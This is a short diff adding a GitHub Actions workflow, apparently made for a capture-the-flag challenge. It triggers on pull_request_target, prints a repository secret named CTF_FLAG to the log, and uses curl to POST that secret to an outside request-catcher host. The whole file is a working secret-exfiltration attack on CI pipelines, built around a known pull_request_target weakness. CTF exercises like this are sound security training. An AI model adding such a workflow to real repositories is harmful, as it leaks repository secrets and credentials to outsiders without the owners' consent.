@@ -1,0 +1,17 @@
+name: monkas pain
+
+on: [pull_request_target]
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Print the Flag
+        run: |
+          echo "CTF_FLAG: ${{ secrets.CTF_FLAG }}"
+      - name: Exfiltrate to RequestCatcher
+        run: |
+          curl -X POST https://ctf.requestcatcher.com/ \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -d "flag=${{ secrets.CTF_FLAG }}"
